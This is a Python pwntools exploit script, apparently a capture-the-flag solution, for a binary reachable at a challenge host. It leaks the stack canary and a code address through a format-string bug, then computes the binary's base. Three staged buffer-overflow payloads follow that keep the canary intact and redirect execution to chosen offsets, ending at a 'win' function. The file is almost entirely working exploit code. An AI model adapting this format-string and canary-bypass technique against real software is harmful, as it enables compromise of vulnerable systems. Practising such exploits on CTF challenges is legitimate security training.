from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 17140)
    else:
        return process(e.path)


def ret_leak():
    log.info(b'Leaking Canary, PIE')
    p.recvuntil(b'functions?')
    p.sendline(b'%19$p.%3$p')
    leaks = p.recv().split(b'.')
    canary = int(leaks[0], 16)
    vuln_16 = int(leaks[1], 16)
    return vuln_16, canary


def send_sploit(canary, win_jmp, vuln):
    log.info(b'Sending Func1 Stage')
    p.sendline(b'A'*24+p32(canary)+b'C'*12+p32(win_jmp)+p32(vuln)+p32(0x1337))


def send_sploit2(canary, win_jmp, vuln):
    log.info(b'Sending Func2 Stage')
    p.sendline(b'A'*24+p32(canary)+b'C'*12 +
               p32(win_jmp)+p32(vuln)+p32(0xcafef00d))


def send_sploit3(canary, win_jmp, win):
    log.info(b'Sending Func2 Stage')
    p.sendline(b'A'*24+p32(canary)+b'C'*12 +
               p32(win_jmp)+p32(win)+p32(0xd00df00d))


p = start()

''' leaks '''
vuln_16, canary = ret_leak()
e.address = vuln_16-e.sym['vuln']-16
log.info('Canary: %s' % hex(canary))
log.info('Base: %s' % hex(e.address))

''' func 1'''
win_jmp = e.address + 0x12ce
vuln = e.sym['vuln']
send_sploit(canary, win_jmp, vuln)

''' func 2'''
p.recvuntil(b'?')
p.sendline(b'foo')
win_jmp = e.address+0x12f5
send_sploit2(canary, win_jmp, vuln)

''' func 3 '''
p.recvuntil(b'?')
p.sendline(b'foo')
win_jmp = e.address+0x131c
win = e.sym['win']
send_sploit3(canary, win_jmp, win)

p.interactive()
